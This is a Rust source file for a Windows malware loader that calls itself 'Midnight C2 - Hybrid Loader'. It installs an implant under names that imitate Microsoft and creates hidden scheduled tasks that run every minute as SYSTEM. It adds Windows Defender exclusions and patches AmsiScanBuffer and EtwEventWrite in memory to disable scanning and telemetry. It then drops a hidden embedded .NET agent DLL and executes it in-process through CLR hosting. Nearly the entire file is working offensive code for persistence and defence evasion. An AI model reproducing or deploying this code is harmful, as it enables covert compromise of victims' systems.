#![windows_subsystem = "windows"]

use windows::core::{GUID, HSTRING, PCWSTR, Interface};
use windows::Win32::Foundation::*;
use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
use windows::Win32::System::ClrHosting::{
    CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo,
};
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::Graphics::Gdi::*;
use std::ptr;
use std::os::windows::process::CommandExt;
use std::path::Path;
use windows::Win32::UI::Shell::IsUserAnAdmin;

// Interface IIDs
const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);

const EXE_NAME: &str = "SecurityHost.exe";

// Edit control messages (not exported by windows-rs)
const EM_SETSEL: u32 = 0x00B1;
const EM_REPLACESEL: u32 = 0x00C2;

// GDI Font constants (may not be exported by windows-rs)
const FW_NORMAL: i32 = 400;
const DEFAULT_CHARSET: u32 = 1;
const OUT_DEFAULT_PRECIS: u32 = 0;
const CLIP_DEFAULT_PRECIS: u32 = 0;
const CLEARTYPE_QUALITY: u32 = 5;
const FF_MODERN: u32 = 48;  // 0x30
const FIXED_PITCH: u32 = 1;

// CLRCreateInstance function pointer type
type CLRCreateInstanceFn = unsafe extern "system" fn(
    *const GUID,
    *const GUID,
    *mut *mut core::ffi::c_void,
) -> i32;

// ========================
// UI GLOBALS
// ========================
static mut EDIT_HWND: HWND = HWND(0);
static mut DARK_BRUSH: HBRUSH = HBRUSH(0);

// Colors
const BG_COLOR: COLORREF = COLORREF(0x001E1E1E);   // Dark background (#1E1E1E)
const TEXT_COLOR: COLORREF = COLORREF(0x00FFFFFF);  // White text

// ========================
// UI FUNCTIONS
// ========================
unsafe fn append_log(text: &str) {
    if EDIT_HWND.0 == 0 { return; }
    
    let display = format!("{}\r\n", text);
    
    // Move cursor to end
    SendMessageW(EDIT_HWND, EM_SETSEL, WPARAM(u32::MAX as usize), LPARAM(-1));
    
    // Insert text at cursor
    let wide: Vec<u16> = display.encode_utf16().chain(std::iter::once(0)).collect();
    SendMessageW(EDIT_HWND, EM_REPLACESEL, WPARAM(0), LPARAM(wide.as_ptr() as isize));
    
    // Auto scroll to bottom
    SendMessageW(EDIT_HWND, WM_VSCROLL, WPARAM(SB_BOTTOM.0 as usize), LPARAM(0));
}

unsafe extern "system" fn wnd_proc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
    match msg {
        WM_CTLCOLORSTATIC | WM_CTLCOLOREDIT => {
            let hdc = HDC(wparam.0 as isize);
            SetTextColor(hdc, TEXT_COLOR);
            SetBkColor(hdc, BG_COLOR);
            return LRESULT(DARK_BRUSH.0);
        }
        WM_CLOSE => {
            DestroyWindow(hwnd).ok();
            return LRESULT(0);
        }
        WM_DESTROY => {
            PostQuitMessage(0);
            return LRESULT(0);
        }
        _ => {}
    }
    DefWindowProcW(hwnd, msg, wparam, lparam)
}

unsafe fn create_installer_window() -> HWND {
    // Create dark brush for background
    DARK_BRUSH = CreateSolidBrush(BG_COLOR);
    
    // Register window class
    let class_name = HSTRING::from("MidnightInstallerClass");
    let wc = WNDCLASSEXW {
        cbSize: std::mem::size_of::<WNDCLASSEXW>() as u32,
        style: CS_HREDRAW | CS_VREDRAW,
        lpfnWndProc: Some(wnd_proc),
        hbrBackground: DARK_BRUSH,
        lpszClassName: PCWSTR(class_name.as_ptr()),
        hCursor: LoadCursorW(HINSTANCE(0), IDC_ARROW).unwrap_or_default(),
        ..Default::default()
    };
    RegisterClassExW(&wc);
    
    // Window size
    let width = 700;
    let height = 480;
    
    // Center on screen
    let screen_w = GetSystemMetrics(SM_CXSCREEN);
    let screen_h = GetSystemMetrics(SM_CYSCREEN);
    let x = (screen_w - width) / 2;
    let y = (screen_h - height) / 2;
    
    // Create main window
    let title = HSTRING::from("Midnight C2 - Installer");
    let hwnd = CreateWindowExW(
        WINDOW_EX_STYLE(0),
        PCWSTR(class_name.as_ptr()),
        PCWSTR(title.as_ptr()),
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        x, y, width, height,
        HWND(0),
        HMENU(0),
        HINSTANCE(0),
        None,
    );
    
    // Create multiline edit control (the "terminal" area)
    let edit_class = HSTRING::from("EDIT");
    EDIT_HWND = CreateWindowExW(
        WINDOW_EX_STYLE(0),
        PCWSTR(edit_class.as_ptr()),
        PCWSTR::null(),
        WINDOW_STYLE(
            WS_CHILD.0 | WS_VISIBLE.0 | WS_VSCROLL.0 |
            ES_MULTILINE as u32 | ES_AUTOVSCROLL as u32 | ES_READONLY as u32
        ),
        10, 10, width - 36, height - 60,
        hwnd,
        HMENU(1001),
        HINSTANCE(0),
        None,
    );
    
    // Set monospace font (Consolas) using LOGFONTW
    let font_name_str = "Consolas";
    let mut lf: LOGFONTW = std::mem::zeroed();
    lf.lfHeight = 16;
    lf.lfWeight = FW_NORMAL;
    lf.lfCharSet = FONT_CHARSET(DEFAULT_CHARSET as u8);
    lf.lfOutPrecision = FONT_OUTPUT_PRECISION(OUT_DEFAULT_PRECIS as u8);
    lf.lfClipPrecision = FONT_CLIP_PRECISION(CLIP_DEFAULT_PRECIS as u8);
    lf.lfQuality = FONT_QUALITY(CLEARTYPE_QUALITY as u8);
    lf.lfPitchAndFamily = (FF_MODERN | FIXED_PITCH) as u8;
    // Copy font name into lfFaceName
    for (i, c) in font_name_str.encode_utf16().enumerate() {
        if i >= 31 { break; }
        lf.lfFaceName[i] = c;
    }
    let hfont = CreateFontIndirectW(&lf);
    SendMessageW(EDIT_HWND, WM_SETFONT, WPARAM(hfont.0 as usize), LPARAM(1));
    
    // Show window
    let _ = ShowWindow(hwnd, SW_SHOW);
    let _ = RedrawWindow(hwnd, None, HRGN(0), RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN);
    
    hwnd
}

// ========================
// INSTALLATION LOGIC
// ========================
fn get_install_info() -> (String, String, bool) {
    unsafe {
        let is_admin = IsUserAnAdmin().as_bool();
        if is_admin {
            (
                r"C:\ProgramData\Microsoft\Windows\Security".to_string(),
                "Microsoft Security Service".to_string(),
                true
            )
        } else {
            let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string());
            (
                format!(r"{}\Microsoft\Windows\Security", local_app_data),
                "Microsoft OneDrive Update".to_string(),
                false
            )
        }
    }
}

fn uninstall_old_agent() {
    unsafe { append_log("[*] Checking for existing installations..."); }
    
    let system_task = "Microsoft Security Service";
    let user_task = "Microsoft OneDrive Update";
    let system_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
    let user_path = format!(
        r"{}\Microsoft\Windows\Security\SecurityHost.exe",
        std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Temp".to_string())
    );

    for task in &[system_task, user_task] {
        let _ = std::process::Command::new("schtasks")
            .args(&["/Delete", "/TN", task, "/F"])
            .creation_flags(0x08000000)
            .output();
    }
    
    for _ in 0..3 {
        let _ = std::process::Command::new("taskkill")
            .args(&["/F", "/T", "/IM", EXE_NAME])
            .creation_flags(0x08000000)
            .output();
        std::thread::sleep(std::time::Duration::from_millis(100));
    }

    let kill_by_module = r#"Get-Process powershell,pwsh -ErrorAction SilentlyContinue | Where-Object { $_.Modules.ModuleName -like 'WinSec*.dll' } | Stop-Process -Force"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_module])
        .creation_flags(0x08000000)
        .output();
        
    let kill_by_cmd = r#"Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*MidnightAgent*' -or $_.CommandLine -like '*WinSec*' } | Stop-Process -Force -ErrorAction SilentlyContinue"#;
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-Command", kill_by_cmd])
        .creation_flags(0x08000000)
        .output();
    
    std::thread::sleep(std::time::Duration::from_secs(3));
    
    let paths = [system_path.to_string(), user_path];
    for path_str in paths.iter() {
        let path = Path::new(path_str);
        if path.exists() {
            let _ = std::fs::remove_file(path);
            if let Some(parent) = path.parent() {
                let _ = std::fs::remove_dir(parent);
            }
            unsafe { append_log(&format!("    [+] Removed: {}", path_str)); }
        }
    }
    
    unsafe { append_log("[+] Cleanup complete"); }
}

fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
    unsafe { append_log("[*] Installing Midnight C2 Agent..."); }
    
    let (install_folder, task_name, is_admin) = get_install_info();
    let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
    
    // 1. Create directory
    std::fs::create_dir_all(&install_folder)?;
    unsafe { append_log(&format!("[+] Directory: {}", install_folder)); }
    
    // 2. Add Windows Defender Exclusions
    let exclusion_cmd = format!(
        "Add-MpPreference -ExclusionPath '{}' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionProcess '{}' -ErrorAction SilentlyContinue; \
         Add-MpPreference -ExclusionPath '$env:TEMP\\MpSigStub.dll' -ErrorAction SilentlyContinue",
        install_folder, EXE_NAME
    );
    let _ = std::process::Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &exclusion_cmd])
        .creation_flags(0x08000000)
        .output();
    unsafe { append_log("[+] Defender exclusions added"); }
    
    // 3. Copy executable
    let current_exe = std::env::current_exe()?;
    let mut copied = false;
    for _ in 0..3 {
        let _ = std::fs::remove_file(&install_path);
        if std::fs::copy(&current_exe, &install_path).is_ok() {
            copied = true;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(1000));
    }
    
    if !copied {
        unsafe { append_log(&format!("[!] Failed to copy to: {}", install_path)); }
    } else {
        unsafe { append_log(&format!("[+] Installed to: {}", install_path)); }
    }
    
    // 4. Create Scheduled Task
    let principal_xml = if is_admin {
        r#"<Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>"#
    } else {
        r#"<Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>"#
    };

    let trigger_xml = if is_admin {
        r#"<BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    } else {
        r#"<LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT1M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2020-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>"#
    };

    let task_xml = format!(r#"<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Security Service</Description>
  </RegistrationInfo>
  <Triggers>
    {}
  </Triggers>
  <Principals>
    {}
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{}"</Command>
      <Arguments>agent</Arguments>
    </Exec>
  </Actions>
</Task>"#, trigger_xml, principal_xml, install_path);
    
    let temp_xml = std::env::temp_dir().join("mstask.xml");
    std::fs::write(&temp_xml, task_xml)?;
    
    let output = std::process::Command::new("schtasks")
        .args(&[
            "/Create",
            "/TN", &task_name,
            "/XML", temp_xml.to_str().unwrap(),
            "/F"
        ])
        .creation_flags(0x08000000)
        .output()?;
    
    let _ = std::fs::remove_file(&temp_xml);
    
    if output.status.success() {
        unsafe { append_log(&format!("[+] Scheduled task: {}", task_name)); }
        
        let _ = std::process::Command::new("schtasks")
            .args(&["/Run", "/TN", &task_name])
            .creation_flags(0x08000000)
            .output();
        unsafe { append_log("[+] Task started"); }
    } else {
        unsafe { append_log("[!] Failed to create scheduled task"); }
    }
    
    Ok(())
}

// ========================
// MAIN ENTRY POINT
// ========================
fn main() -> windows::core::Result<()> {
    unsafe {
        let args: Vec<String> = std::env::args().collect();
        let (current_path, target_path, _) = get_install_info();
        
        // --- IMPROVED AGENT MODE DETECTION (v0.6.10 Memory Restore) ---
        let is_target_path = current_path.to_lowercase() == target_path.to_lowercase();
        let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
        let is_agent_mode = (args.len() > 1 && args[1] == "agent") || is_target_path || is_system;
        
        if !is_agent_mode {
            // ===== INSTALLER MODE (with UI) =====
            let hwnd = create_installer_window();
            let (_, _, is_admin) = get_install_info();
            
            std::thread::spawn(move || {
                append_log("╔════════════════════════════════════════╗");
                append_log("║   Midnight C2 - Hybrid Loader v0.6.11 ║");
                append_log("║       Build Date: 2026-02-15          ║");
                append_log("╚════════════════════════════════════════╝");
                append_log("");

                if !is_admin {
                    append_log(" [!] ERROR: Administrator privileges required!");
                    append_log("");
                    append_log(" Please right-click SecurityHost.exe and");
                    append_log(" select 'Run as administrator'.");
                    append_log("");
                    append_log("════════════════════════════════════════");
                    return; // Stop here
                }

                append_log("[*] Running in INSTALLER mode [ADMIN]");
                append_log("");
                
                // Step 1: Uninstall old
                uninstall_old_agent();
                append_log("");
                
                // Step 2: Install
                match install_agent() {
                    Ok(_) => {
                        append_log("");
                        append_log("════════════════════════════════════════");
                        append_log("  ✅ Installation Complete!");
                        append_log("  Agent will start via Scheduled Task");
                        append_log("════════════════════════════════════════");
                        append_log("");
                        append_log("[*] Closing window in 3 seconds...");
                        
                        // Wait 3 seconds before closing
                        std::thread::sleep(std::time::Duration::from_secs(3));
                        PostMessageW(hwnd, WM_CLOSE, WPARAM(0), LPARAM(0)).ok();
                    }
                    Err(e) => {
                        append_log(&format!("[!] Installation failed: {}", e));
                    }
                }
            });
            
            // Message loop (keeps UI alive)
            let mut msg = MSG::default();
            while GetMessageW(&mut msg, HWND(0), 0, 0).into() {
                let _ = TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }
            
            return Ok(());
        }
        
        // ===== AGENT MODE (completely hidden, no UI) =====
        
        // 0. AMSI Bypass
        {
            let amsi_func_name = std::ffi::CString::new("AmsiScanBuffer").unwrap();
            let amsi_name = HSTRING::from("amsi.dll");
            let amsi = LoadLibraryW(PCWSTR(amsi_name.as_ptr()));
            if let Ok(amsi_handle) = amsi {
                if !amsi_handle.is_invalid() {
                    let func_addr = GetProcAddress(amsi_handle, windows::core::PCSTR(amsi_func_name.as_ptr() as *const u8));
                    if let Some(addr) = func_addr {
                        let addr = addr as *mut u8;
                        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
                        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
                        let _ = windows::Win32::System::Memory::VirtualProtect(
                            addr as *const core::ffi::c_void, patch.len(),
                            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect
                        );
                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(
                            addr as *const core::ffi::c_void, patch.len(),
                            old_protect, &mut old_protect
                        );
                    }
                }
            }
        }
        
        // 0.5 ETW Bypass
        {
            let etw_func_name = std::ffi::CString::new("EtwEventWrite").unwrap();
            let ntdll_name = HSTRING::from("ntdll.dll");
            let ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()));
            if let Ok(ntdll_handle) = ntdll {
                if !ntdll_handle.is_invalid() {
                    let func_addr = GetProcAddress(ntdll_handle, windows::core::PCSTR(etw_func_name.as_ptr() as *const u8));
                    if let Some(addr) = func_addr {
                        let addr = addr as *mut u8;
                        let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
                        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
                        let _ = windows::Win32::System::Memory::VirtualProtect(
                            addr as *const core::ffi::c_void, patch.len(),
                            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect
                        );
                        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
                        let _ = windows::Win32::System::Memory::VirtualProtect(
                            addr as *const core::ffi::c_void, patch.len(),
                            old_protect, &mut old_protect
                        );
                    }
                }
            }
        }
        
        // 1. Initialize COM
        CoInitializeEx(None, COINIT_MULTITHREADED)?;

        // 2. Load mscoree.dll
        let mscoree_name = HSTRING::from("mscoree.dll");
        let mscoree = LoadLibraryW(PCWSTR(mscoree_name.as_ptr()))?;
        if mscoree.is_invalid() { return Ok(()); }

        // 3. Get CLRCreateInstance
        let proc_name = std::ffi::CString::new("CLRCreateInstance").unwrap();
        let clr_create_instance_ptr = GetProcAddress(mscoree, windows::core::PCSTR(proc_name.as_ptr() as *const u8));
        if clr_create_instance_ptr.is_none() { return Ok(()); }
        let clr_create_instance: CLRCreateInstanceFn = std::mem::transmute(clr_create_instance_ptr.unwrap());

        // 4. Create MetaHost
        let mut metahost_ptr: *mut core::ffi::c_void = ptr::null_mut();
        let hr = clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLR_META_HOST, &mut metahost_ptr);
        if hr != 0 { return Ok(()); }
        let metahost: ICLRMetaHost = ICLRMetaHost::from_raw(metahost_ptr);

        // 5. Get Runtime Info
        let runtime_version = HSTRING::from("v4.0.30319");
        let runtime_info: ICLRRuntimeInfo = metahost.GetRuntime(PCWSTR(runtime_version.as_ptr()))?;
        
        // 6. Get ICLRRuntimeHost
        const CLSID_CLR_RUNTIME_HOST: GUID = GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02);
        use windows::Win32::System::ClrHosting::ICLRRuntimeHost;
        let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&CLSID_CLR_RUNTIME_HOST)?;

        // 7. Start CLR
        runtime_host.Start()?;

        // 8. Load embedded DLL
        let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");

        // 9. Write to temp
        let temp_dir = std::env::temp_dir();
        let dll_path = temp_dir.join("MpSigStub.dll");
        if dll_path.exists() { let _ = std::fs::remove_file(&dll_path); }
        std::fs::write(&dll_path, dll_bytes).expect("Failed to write payload");
        
        // Hide file
        let path_hstring = HSTRING::from(dll_path.to_str().unwrap());
        let _ = windows::Win32::Storage::FileSystem::SetFileAttributesW(
            PCWSTR(path_hstring.as_ptr()),
            windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM
        );

        // 10. Execute In-Process
        let type_name = HSTRING::from("MidnightAgent.Program");
        let method_name = HSTRING::from("Run");
        let method_arg = HSTRING::from("");

        let result = runtime_host.ExecuteInDefaultAppDomain(
            PCWSTR(path_hstring.as_ptr()),
            PCWSTR(type_name.as_ptr()),
            PCWSTR(method_name.as_ptr()),
            PCWSTR(method_arg.as_ptr())
        );
        
        match result {
            Ok(_) => {},
            Err(_) => {},
        }
        
        Ok(())
    }
}
